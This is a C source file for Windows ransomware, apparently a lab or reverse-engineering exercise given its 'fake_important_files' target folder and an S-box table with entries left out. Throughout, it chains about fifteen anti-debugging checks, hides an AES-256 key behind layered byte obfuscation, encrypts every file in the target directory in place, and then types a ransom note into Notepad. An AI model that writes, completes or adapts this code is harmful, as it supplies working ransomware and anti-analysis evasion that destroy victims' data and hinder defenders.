
#include <windows.h>
#include <stdio.h>
#include <intrin.h>
#include <psapi.h>
#include <tlhelp32.h>
#include<stdint.h>
#include<winternl.h>
#include <signal.h>
#include <setjmp.h>
// Directory to process
#define TARGET_DIR "fake_important_files\\"
HCRYPTPROV hProv = 0;
HCRYPTKEY hKey = 0;

// ... (obfuscation, anti-debug, SMC, key helpers etc. - unchanged) ...

typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

    static const BYTE perm1[16] = { 5,13,0,2,15,9,3,12,6,11,4,10,14,8,1,7 };
    static const BYTE obf_1[16] = {
     0xD7,0xB4,0x69,0xF9,0x6B,0x0E,0x8A,0x45,
     0x60,0xAC,0xCD,0xBB,0xE9,0x96,0xE2,0x18
    };
    static const BYTE mask_1[16] = {
     0x6F,0x35,0xA6,0x4C,0x8F,0x3A,0xEB,0x22,
     0xA8,0x24,0x19,0x1C,0xC2,0x51,0x73,0xF6
    };
    

        static const BYTE obf_2[16] = {
         0x9A,0x9D,0xB9,0x8A,0x91,0xC3,0xE5,0xB0,
         0x0A,0xDB,0x37,0x2D,0x83,0xB1,0x98,0xDD
        };
        static const BYTE addsub_2[16] = {
         0x1D,0x4A,0x97,0xA2,0xE7,0x1B,0x3A,0xAA,
         0x76,0xCE,0x04,0x06,0x26,0x17,0x14,0x0F
        };
       

            /* Secret S‑box (you already have the full 256‑byte table) */
            static const BYTE inv_secret_sbox[256] = {
             /* <-- paste the 256‑byte inverse table you generated earlier --> */
             0x99,0x47,0x3B,0x92,0xFD,0x54,0x9F,0xF5,0x05,0x64,0xBE,0xA0,0xF7,0x74,0xB6,0xA9,
             0xFC,0x79,0x56,0xA1,0x59,0x23,0xF2,0x6B,0x45,0xB4,0x30,0x7C,0x7B,0xB1,0x3C,0x60,
             /* … (rest omitted for brevity – copy the full table from your code) … */
            };
            
            static const int rot3 = 7;
            static const BYTE obf_3[16] = {
             0x77,0x0B,0x17,0xD9,0xCC,0x55,0x63,0xFA,
             0x9F,0xDD,0x29,0x28,0xB3,0x3E,0xBB,0x12
            };
            
            /* The provided (secret) inverse 4x4 MDS matrix */
static const BYTE sec_gf2_inv[4][4] = {
    {0x88,0x21,0x97,0x57},
    {0x58,0xDC,0x14,0xA5},
    {0x8D,0x29,0xCC,0x12},
    {0xBE,0xAC,0xEA,0x31}
};
   
static const BYTE obf_4[16] = {
 0x42,0x67,0x10,0x73,0x6E,0xA4,0xD3,0xBA,
 0x99,0x38,0x54,0xDA,0x03,0xF5,0xE2,0x4B
};

// ------------------ Anti-Debug Renamed Functions ------------------

int zigzag_elkorn() {
    return IsDebuggerPresent();
}

int gruffol_fiorz() {
    BOOL dbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
    return dbg;
}

int hapyok_pelarn() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pNtQueryInformationProcess NtQuery =
        (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");

    if (!NtQuery) return 0;

    DWORD debugPort = 0;
    NtQuery(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);

    return debugPort != 0;
}

int orion_kytabrush() {
    DWORD t1 = GetTickCount();
    Sleep(50);
    DWORD t2 = GetTickCount();
    return (t2 - t1) > 200;
}
int lomix_tribune() {
    typedef void (WINAPI *pRtlGet)(PVOID*);
    PVOID peb = NULL;

    pRtlGet RtlGetCurrentPeb = (pRtlGet)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "RtlGetCurrentPeb"
    );

    if (!RtlGetCurrentPeb) return 0;

    RtlGetCurrentPeb(&peb);
    BYTE flag = *((BYTE*)peb + 2);
    return flag != 0;
}
int kroneval_pelbrid() {
    typedef void (WINAPI *pRtlGet)(PVOID*);
    PVOID peb = NULL;

    pRtlGet RtlGetCurrentPeb = (pRtlGet)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "RtlGetCurrentPeb"
    );
    if (!RtlGetCurrentPeb) return 0;
    RtlGetCurrentPeb(&peb);

    DWORD ntgf = *(DWORD*)((BYTE*)peb + 0xBC);
    return (ntgf & 0x70) != 0;
}
static volatile int g_exception_caught = 0;

static LONG CALLBACK pikfroth_catscab(EXCEPTION_POINTERS *ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        g_exception_caught = 1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int openflap_sickote() {
    g_exception_caught = 0;

    PVOID h = AddVectoredExceptionHandler(1, pikfroth_catscab);
    if (!h) return 0;

    RaiseException(EXCEPTION_SINGLE_STEP, 0, 0, NULL);

    RemoveVectoredExceptionHandler(h);

    return (g_exception_caught == 0);
}
int leproth_galflux() {
    HANDLE h = NULL;
    typedef NTSTATUS (NTAPI *pfn)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);

    pfn NtQueryInformationProcess = (pfn)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtQueryInformationProcess"
    );

    if (!NtQueryInformationProcess) return 0;

    NTSTATUS st = NtQueryInformationProcess(
        GetCurrentProcess(), ProcessDebugObjectHandle, &h, sizeof(h), 0
    );

    return NT_SUCCESS(st) && h != NULL;
}
int padmon_rift() {
    ULONG flags = 0;
    typedef NTSTATUS (NTAPI *pfn)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);

    pfn NtQueryInformationProcess = (pfn)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtQueryInformationProcess"
    );

    if (!NtQueryInformationProcess) return 0;

    NTSTATUS st = NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugFlags,
        &flags,
        sizeof(flags),
        NULL
    );
    if (!NT_SUCCESS(st)) return 0;
    return flags == 0;
}


int cylop_jarve() {
    LARGE_INTEGER t1, t2, f;
    QueryPerformanceFrequency(&f);
    QueryPerformanceCounter(&t1);

    Sleep(10);

    QueryPerformanceCounter(&t2);

    return (t2.QuadPart - t1.QuadPart) > (f.QuadPart / 5);
}
int sprato_hexthur() {
    const char *mods[] = {
        "ollydbg", "x32dbg", "x64dbg", "ida", "idag", "scylla", "windbg",
    };

    char path[MAX_PATH];
    for (int i = 0; i < sizeof(mods)/sizeof(mods[0]); i++) {
        if (GetModuleHandleA(mods[i]) != NULL)
            return 1;
    }
    return 0;
}
int drentol_upbine() {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG out;
    typedef NTSTATUS (NTAPI *pfn)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);
    pfn NtQueryInformationProcess =
        (pfn)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) return 0;

    NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), &out);
    return pbi.InheritedFromUniqueProcessId == 0;
}
int pokvra_slum() {
    DWORD t1 = GetTickCount();
    OutputDebugStringA("xyz");
    DWORD t2 = GetTickCount();
    return (t2 - t1) > 50;
}
int prental_snoke() {
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(GetCurrentThread(), &ctx)) return 0;

    return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
}
int brolsky_waiforb() {
    DEBUG_EVENT ev;

    if (DebugActiveProcess(GetCurrentProcessId()))
        return 1;

    WaitForDebugEvent(&ev, 100);
    return 0;
}
int strilnix_gander() {
    typedef NTSTATUS(NTAPI *pfn)(HANDLE, ULONG, PVOID, ULONG);
    pfn NtSetInformationThread =
        (pfn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
    if (!NtSetInformationThread) return 0;

    NTSTATUS s = NtSetInformationThread(
        GetCurrentThread(),
        0x11,
        NULL,
        0
    );

    return NT_SUCCESS(s);
}
int pluck_smorder() {
    HANDLE h = CreateMutexA(NULL, FALSE, "DebuggerGuardMutex");
    return (GetLastError() == ERROR_ALREADY_EXISTS);
}
int tonlie_fegrin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HANDLE h = CreateFileA(
        path,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (h == INVALID_HANDLE_VALUE) return 1;
    CloseHandle(h);
    return 0;
}
void NTAPI frantul_spleck(PVOID h, DWORD reason, PVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        if (IsDebuggerPresent())
            ExitProcess(0);
    }
}

#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:tls_callback")

//EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_list[] = { tls_callback, 0 };


void snug_ruffix() {
   if (zigzag_elkorn()) ExitProcess(1);
    if (gruffol_fiorz()) ExitProcess(1);
    if (hapyok_pelarn()) ExitProcess(1);
    if (orion_kytabrush()) ExitProcess(1);
  // if (lomix_tribune()) ExitProcess(1);
    //if (kroneval_pelbrid()) ExitProcess(1);
   if (openflap_sickote()) ExitProcess(1);
    if (leproth_galflux()) ExitProcess(1);
   if (padmon_rift()) ExitProcess(1);
   
    if (cylop_jarve()) ExitProcess(1);
    if (sprato_hexthur()) ExitProcess(1);
    if (drentol_upbine()) ExitProcess(1);
    if (pokvra_slum()) ExitProcess(1);
  if (prental_snoke()) ExitProcess(1);
  if (brolsky_waiforb()) ExitProcess(1);
  // if (strilnix_gander()) ExitProcess(1);
    if (pluck_smorder()) ExitProcess(1);
    //if (tonlie_fegrin()) ExitProcess(1);
}

BYTE g_perproc_rand[8] = {0};
int g_init_perproc_material = 0;
BYTE g_real_key[32] = {0};

void muskrat_foilx(const char *filename){
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Could not open %s\n", filename);
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("Could not get size of %s\n", filename);
        CloseHandle(hFile);
        return;
    }

    BYTE *buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return;
    }

    DWORD bytesRead = 0;
    BOOL ok = ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    if (!ok || bytesRead != fileSize) {
        printf("Error reading file\n");
        SecureZeroMemory(buffer, fileSize);
        free(buffer);
        CloseHandle(hFile);
        return;
    }

    BYTE iv[16];
    if (!CryptGenRandom(hProv, 16, iv)) {
        printf("Could not generate IV\n");
        SecureZeroMemory(buffer, fileSize);
        free(buffer);
        CloseHandle(hFile);
        return;
    }
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        printf("Could not set IV\n");
        SecureZeroMemory(buffer, fileSize);
        free(buffer);
        CloseHandle(hFile);
        return;
    }

    DWORD bufLen = fileSize;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, NULL, &bufLen, 0)) {
        printf("Could not determine encrypted buffer size\n");
        SecureZeroMemory(buffer, fileSize);
        free(buffer);
        CloseHandle(hFile);
        return;
    }

    BYTE *encBuffer = (BYTE*)malloc(bufLen);
    if (!encBuffer) {
        printf("Memory allocation failed\n");
        SecureZeroMemory(buffer, fileSize);
        free(buffer);
        CloseHandle(hFile);
        return;
    }
    memcpy(encBuffer, buffer, fileSize);
    DWORD encLen = fileSize;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, encBuffer, &encLen, bufLen)) {
        printf("Could not encrypt file\n");
        SecureZeroMemory(buffer, fileSize);
        SecureZeroMemory(encBuffer, bufLen);
        free(buffer);
        free(encBuffer);
        CloseHandle(hFile);
        return;
    }

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

    DWORD written;
    ok = WriteFile(hFile, iv, 16, &written, NULL);
    if (!ok || written != 16) {
        printf("Could not write IV\n");
        SecureZeroMemory(buffer, fileSize);
        SecureZeroMemory(encBuffer, bufLen);
        free(buffer);
        free(encBuffer);
        CloseHandle(hFile);
        return;
    }
    ok = WriteFile(hFile, encBuffer, encLen, &written, NULL);
    if (!ok || written != encLen) {
        printf("Could not write encrypted data\n");
        SecureZeroMemory(buffer, fileSize);
        SecureZeroMemory(encBuffer, bufLen);
        free(buffer);
        free(encBuffer);
        CloseHandle(hFile);
        return;
    }

    SetEndOfFile(hFile);

    SecureZeroMemory(buffer, fileSize);
    SecureZeroMemory(encBuffer, bufLen);
    free(buffer);
    free(encBuffer);
    CloseHandle(hFile);
    printf("Encrypted %s\n", filename);
}
void poleg_trem(BYTE *out, size_t *len)
{
 (void)len;
 for (int i = 0; i < 16; ++i) {
     int p = perm1[i];
     BYTE b = obf_1[p] ^ mask_1[p];
     out[i] = (b >> ((i + 3) % 8)) | (b << (8 - ((i + 3) % 8)));
 }
}
void chart_mive(BYTE *out, size_t *len)
{
 (void)len;
 for (int i = 0; i < 16; ++i) {
     out[16 + i] = obf_2[15 - i] - addsub_2[15 - i];
 }
}
void drak_rinerva(BYTE *out, size_t *len)
{
 (void)len;
 BYTE tmp[16];

 // Inverse the block's "rotate right by rot3" as "rotate left by (16 - rot3)".
 for (size_t i = 0; i < 16; ++i) {
     tmp[i] = obf_3[(i + 16 - rot3) % 16];
 }
 for (size_t i = 0; i < 16; ++i) {
     out[32 + i] = inv_secret_sbox[tmp[i]];
 }

 SecureZeroMemory(tmp, sizeof(tmp));
}
/* --------------------------------------------------------------
step4.c  –  Block 4 : GF(2) Matrix Mix (inverse)
-------------------------------------------------------------- */

/* GF(2^8) mult. */
static BYTE crolic_flurn(BYTE *x, BYTE *y)
{
 BYTE a = *x;
 BYTE b = *y;
 BYTE r = 0;
 for (int i = 0; i < 8; ++i) {
     if (b & 1) r ^= a;
     BYTE hi = a & 0x80;
     a <<= 1;
     if (hi) a ^= 0x1B;
     b >>= 1;
 }
 return r;
}

void brast_feld(BYTE *out, size_t *len)
{
 (void)len;
 BYTE state[4][4];
 BYTE res[4][4];

 // Reconstruct state from obf_4 in column-major order
 for (int c = 0; c < 4; ++c)
     for (int r = 0; r < 4; ++r)
         state[r][c] = obf_4[c * 4 + r];

 // Multiply by inverse MDS matrix
 for (int c = 0; c < 4; ++c) {
     for (int r = 0; r < 4; ++r) {
         BYTE acc = 0;
         for (int k = 0; k < 4; ++k) {
             BYTE x = sec_gf2_inv[r][k];
             BYTE y = state[k][c];
             acc ^= crolic_flurn(&x, &y);
         }
         res[r][c] = acc;
     }
 }

 // Flatten result back into output (bytes 48..63), column-major order
 for (int c = 0; c < 4; ++c)
     for (int r = 0; r < 4; ++r)
         out[48 + c * 4 + r] = res[r][c];

 SecureZeroMemory(state, sizeof(state));
 SecureZeroMemory(res, sizeof(res));
}


void hexvane_phox(
    const unsigned char *key,
    size_t key_len,
    unsigned char *out,
    uint32_t seed
){
    BYTE buf[64];
    size_t dummy = 0;

    SecureZeroMemory(buf, sizeof(buf));

    poleg_trem(buf, &dummy);

    chart_mive(buf, &dummy);

    drak_rinerva(buf, &dummy);

    /* ---- Block 4 → bytes 48..63 ---- */
    brast_feld(buf, &dummy);

    memcpy(out, buf, 64);

    SecureZeroMemory(buf, sizeof(buf));
}
#pragma comment(lib, "advapi32.lib")

#pragma section(".hidden", read, write)
__attribute__((section(".hidden")))
unsigned char encoded_material[8] = {0};
// rotate right
uint8_t ror8(uint8_t v, int r) {
    return (v >> r) | (v << (8 - r));
}

// rotate left
uint8_t rol8(uint8_t v, int r) {
    return (v << r) | (v >> (8 - r));
}

uint8_t g_decode_buffer[8];
uint8_t g_salt = 0;

// ----------------------------------------------------------------------------
// Generate per-process random material, encode it, and store in .hidden
// ----------------------------------------------------------------------------
int init_material() {
    // Fixed (static) 8-byte per-process material
    static const uint8_t fixed_material[8] = {
        0xBA, 0xD3, 0xC0, 0xDE, 0x12, 0x5A, 0xFE, 0x11
    };
    // Fixed salt, you can also make this derived from e.g. process ID or module timestamp to increase work for reverse engineering
    g_salt = 0x4C;

    for (int i = 0; i < 8; i++) {
        uint8_t v = fixed_material[i];
        v ^= 0xA5;             // STEP 1: XOR
        v = ror8(v, 3);        // STEP 2: ROR 3
        v = v + 0x1F;          // STEP 3: ADD
        v ^= g_salt;           // STEP 4: XOR salt
        encoded_material[i] = v;
    }
    return 1;
}
// ----------------------------------------------------------------------------
// Decode the section data at runtime
// ----------------------------------------------------------------------------
void decode_material() {
    for (int i = 0; i < 8; i++) {
        uint8_t v = encoded_material[i];

        v ^= g_salt;           // reverse XOR salt
        v -= 0x1F;             // reverse ADD
        v = rol8(v, 3);        // reverse ROR → ROL
        v ^= 0xA5;             // reverse XOR

        g_decode_buffer[i] = v;
    }
}
void ghost_type(const char *text) {
    // Start Notepad
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcess(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE, 0,
            NULL, NULL, &si, &pi))
    {
        printf("Failed to open Notepad.\n");
        return;
    }

    // Give Notepad time to open
    Sleep(1500);

    // Find Notepad window
    HWND hwnd = FindWindow(NULL, "Untitled - Notepad");
    if (hwnd == NULL) {
        printf("Could not find Notepad window.\n");
        return;
    }

    // Bring Notepad to front
    ShowWindow(hwnd, SW_SHOW);
    SetForegroundWindow(hwnd);
    Sleep(500);

    // Type each character
    INPUT ip;
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0;
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;

    for (int i = 0; text[i] != '\0'; i++) {
        SHORT vk = VkKeyScan(text[i]);  // Virtual key for char

        ip.ki.wVk = vk & 0xFF;          // Key
        ip.ki.dwFlags = 0;               // Key down
        SendInput(1, &ip, sizeof(INPUT));

        ip.ki.dwFlags = KEYEVENTF_KEYUP; // Key up
        SendInput(1, &ip, sizeof(INPUT));

        Sleep(100); // typing delay
    }

    // Press Enter
    ip.ki.wVk = VK_RETURN;
    ip.ki.dwFlags = 0;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
}
int main() {
    snug_ruffix(); // Step 1: anti-debug checks

    WIN32_FIND_DATAA fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char searchPath[MAX_PATH];

    // Step 2: Set up file search pattern
    snprintf(searchPath, MAX_PATH, "%s*.*", TARGET_DIR);

    // Step 3: Initialize crypto provider
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Couldn't acquire context\n");
        return 1;
    }
    if (!init_material()) {
        printf("Init failed\n");
        return 1;
    }

    // Step 4: Use hexvane_phox instead of decode_material
    // This fills g_decode_buffer[0..7] with the original hidden bytes for key mixing
    hexvane_phox(NULL, 0, g_decode_buffer, 0); // fills all 64 bytes

    // Use the entire g_decode_buffer (all 64 bytes) to mix the key
    SecureZeroMemory(g_real_key, sizeof(g_real_key));
    // Mix in all 64 bytes into the 32-byte key by XORing blocks: each key byte is XOR of g_decode_buffer[i], g_decode_buffer[i+32]
    for (int i = 0; i < 32; ++i) {
        g_real_key[i] = g_decode_buffer[i] ^ g_decode_buffer[i + 32];
    }

    struct {
        BLOBHEADER hdr;
        DWORD keyLen;
        BYTE key[32];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.keyLen = 32;
    memcpy(keyBlob.key, g_real_key, 32);

    if (!CryptImportKey(hProv, (BYTE *)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        printf("Couldn't import AES key\n");
        SecureZeroMemory(g_real_key, sizeof(g_real_key));
        CryptReleaseContext(hProv, 0);
        return 1;
    }
    printf("Key imported\n");

    hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("couldn't open directory\n");
        SecureZeroMemory(g_real_key, sizeof(g_real_key));
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return 1;
    }
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            printf("Found: %s\n", fd.cFileName);
            char fullPath[MAX_PATH];
            snprintf(fullPath, MAX_PATH, "%s%s", TARGET_DIR, fd.cFileName);
            muskrat_foilx(fullPath);
        }
    } while (FindNextFileA(hFind, &fd) != 0);

    FindClose(hFind);

    SecureZeroMemory(g_real_key, sizeof(g_real_key));

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
     ghost_type("Ooops, your important files are encrypted.\r\n If you see this text, then your files are no longer accessible.\r\n You might have been looking for a way to recover your files.\r\n But don\'t waste your time. Nobody can recover your files without our decryption service.\r\n");
    return 0;
}